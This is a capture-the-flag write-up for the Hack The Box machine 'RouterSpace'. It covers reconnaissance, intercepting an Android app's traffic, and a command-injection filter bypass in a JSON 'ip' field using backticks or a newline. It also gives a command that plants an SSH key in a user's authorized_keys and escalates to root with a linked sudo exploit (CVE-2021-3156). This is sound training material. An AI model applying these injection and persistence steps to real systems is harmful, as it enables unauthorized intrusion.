
## Nmap
```
$ nmap -sC -sV 10.10.11.148                                                                                                                                                                                                          2 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-04 08:55 EDT
Nmap scan report for routerspace.htb (10.10.11.148)
Host is up (0.096s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-RouterSpace Packet Filtering V1
| ssh-hostkey: 
|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
80/tcp open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-75541
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 68
|     ETag: W/"44-WP57yGzDmPpiyli3cEn4QFConok"
|     Date: Mon, 04 Apr 2022 12:44:13 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: uy B Fy s G B Q8t4 }
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-80373
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Mon, 04 Apr 2022 12:44:12 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-50512
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Mon, 04 Apr 2022 12:44:12 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
|_http-title: RouterSpace
|_http-trane-info: Problem with XML parsing of /evox/about
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.91%I=7%D=4/4%Time=624AEACB%P=x86_64-pc-linux-gnu%r(NULL,
SF:29,"SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.91%I=7%D=4/4%Time=624AEACB%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,13E4,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX
SF:-Cdn:\x20RouterSpace-80373\r\nAccept-Ranges:\x20bytes\r\nCache-Control:
SF:\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x202021
SF:\x2011:33:57\x20GMT\r\nETag:\x20W/\"652c-17d476c9285\"\r\nContent-Type:
SF:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\x2
SF:0Mon,\x2004\x20Apr\x202022\x2012:44:12\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n<!doctype\x20html>\n<html\x20class=\"no-js\"\x20lang=\"zxx\">\n<h
SF:ead>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<met
SF:a\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\x20\x
SF:20\x20<title>RouterSpace</title>\n\x20\x20\x20\x20<meta\x20name=\"descr
SF:iption\"\x20content=\"\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x
SF:20content=\"width=device-width,\x20initial-scale=1\">\n\n\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.min\.css\">\n\x2
SF:0\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/owl\.carousel\.m
SF:in\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/m
SF:agnific-popup\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20h
SF:ref=\"css/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"sty
SF:lesheet\"\x20href=\"css/themify-icons\.css\">\n\x20")%r(HTTPOptions,108
SF:,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x20R
SF:outerSpace-50512\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text/ht
SF:ml;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\"d-bMedpZY
SF:GrVt1nR4x\+qdNZ2GqyRo\"\r\nDate:\x20Mon,\x2004\x20Apr\x202022\x2012:44:
SF:12\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST")%r(RTSPRequest,
SF:2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n"
SF:)%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20c
SF:lose\r\n\r\n")%r(FourOhFourRequest,12A,"HTTP/1\.1\x20200\x20OK\r\nX-Pow
SF:ered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-75541\r\nContent-Type:
SF:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2068\r\nETag:\x20W/
SF:\"44-WP57yGzDmPpiyli3cEn4QFConok\"\r\nDate:\x20Mon,\x2004\x20Apr\x20202
SF:2\x2012:44:13\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20activ
SF:ity\x20detected\x20!!!\x20{RequestID:\x20uy\x20B\x20Fy\x20s\x20G\x20B\x
SF:20\x20Q8t4\x20}\n\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.28 seconds
``` 

with opening browser on http://10.10.11.148 We will find Download button 

![routerspaceWebsite](https://user-images.githubusercontent.com/8396956/161551871-0952c93b-5b5a-4709-8459-387f6861eb88.png)



Now we have file RouterSpace.apk

in my experience with this machine i faced many problems with the apk and the emulators

To run it we can use `Anbox ,android studio or genymotion`.
For me i will go with `anbox` 

Don't waste time and follow 
[Anbox installation](https://dev.to/sbellone/how-to-install-anbox-on-debian-1hjd).

Run the anbox then 
`$ adb install RouterSpace.apk`

![apk](https://user-images.githubusercontent.com/8396956/161553886-31b7a684-f11c-4675-91ec-8c2e84b71406.png)

Click check Status if it works fine then well 

sets the listening port of the anbox to intercept using burp
`$ adb shell settings put global http_proxy 10.10.14.5:8001`

Then go to `burp >proxy >options > Proxy Listerners > Add`

![burp](https://user-images.githubusercontent.com/8396956/161554822-829960d6-b479-4b4e-82c5-3bad994bd394.png)


If you click check status and you got "unable to connect to server" try to unsquash then edit hosts file to add `routerspace.htb` then squashfs again

**The squashfs. img is a SquashFS compressed, read-only, file system holding the Fedora operating system root file system inside another /LiveOS folder containing a rootfs**

Here are the steps :

```
1-  unsquashfs /var/lib/anbox/android.img
2- 10.10.11.148 routerspace.htb into system/etc/hosts
3- mksquashfs squashfs-root /var/lib/anbox/android.img -b 131072 -comp xz -Xbcj x86
4- sudo service anbox-container-manager restart
5- anbox launch --package=org.anbox.appmgr --component=org.anbox.appmgr.AppViewActivity
```

Now let's intercept the requests using burp but go to  /etc/hosts file.
and add `10.10.11.148 routerspace.htb`

![Intercept1](https://user-images.githubusercontent.com/8396956/161556515-71ffa616-3786-4f89-a964-608c3769c338.png)

let's play with this part

`{"ip":"0.0.0.0"}` i tried to make it 
`{"ip":"id"}` and got nothing

trying to exploit and bypass the filter found many ways 
> Writing our command between  `` or adding \n before the command

![Adding ` ` ](https://user-images.githubusercontent.com/8396956/161557090-7a954366-0b1b-4b0c-94d0-467b0e48c24e.png)

![Adding \n](https://user-images.githubusercontent.com/8396956/161557185-001545ba-a5dd-4ef4-80df-67b1510fa4c3.png)


tried to reverse shell but nothing works for me then searched for ssh key but got nothing

So i added my public key into `authorized_keys` of the victim machine

```
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLrNEdZpt0p1FeJ1Ki1MmPDA8+LUeS5ATOUM+zFB2AqCjw4InqZZLqrV9KP+vHuyI1MsqFHaawYKduDkzLE+QoMZPN8o8XUoPfiJphGmSMfPX6BDxSdKpqPhamHqlVc8oHRSmAt5dffdJ27JwdOd8EHHYvIrUI7jc1LMwruJqj9BrLuloCLJmD8hv5zHOccuyOegyO0//ZnB5gyE+BuefUxAoHue+VSx0WKoNeIpC1bRb3f84/PFb+GWF2pZwixecz8V8ng76a1QG7KG/QWvjE9DeRqyynkhwCbQN0vofehfwmhAEW3M3GR8LTbErN6RCe8PpYoXFRdkf6ovMl01KZZ0U+6hHoES8tfjI9M8DwpyvyRQN0tS/69Vcw7wOQxeLVRh9sepyDmFc9ii2wO4g3v1NgQMAgeyGa63XgWsRLbzgah5u6EaMvr5cQVfVoRFk44fFdi+KUuBY9YH+GMlYjKB7rpRv6/jPXzMQKpTc7Hv2tFk8cAKPt61deC5UWb6M= mido@kali' > /home/paul/.ssh/authorized_keys
```

Then check if the file is created

![authorized_keys](https://user-images.githubusercontent.com/8396956/161559353-012be489-d946-4890-8b41-0931662d033b.png)

Now let's ssh to the victim machine and get user :wink:


![PaulSSH](https://user-images.githubusercontent.com/8396956/161560326-21f5f1df-721e-4927-b6b3-75ad526bcd5c.png)

##privilege escalation (Root)

Trying to download `linpeas.sh` on the machine

by opening python server from my machine `python -m SimpleHTTPServer 8000`

But it don't connect so i copied the file from my machine to victime machine using `scp`

`scp linpeas.sh paul@10.10.11.148`

Here is result of **linpeas**

![linp](https://user-images.githubusercontent.com/8396956/161561442-508f57fa-c7fb-412a-87b1-acea0c52a46e.png)

we find the sudo version is `1.8.31` 

Searching for exploit and found [CVE-2021-3156] (https://github.com/blasty/CVE-2021-3156)

copying the exploit to the victim machine with `scp` 

![scp](https://user-images.githubusercontent.com/8396956/161562117-2c6bec45-de44-4bbe-9fc1-dc8191153ddb.png)


![RootDone](https://user-images.githubusercontent.com/8396956/161562600-7c042a77-e3f7-463b-a282-0632c3b39add.png)

## Rooted












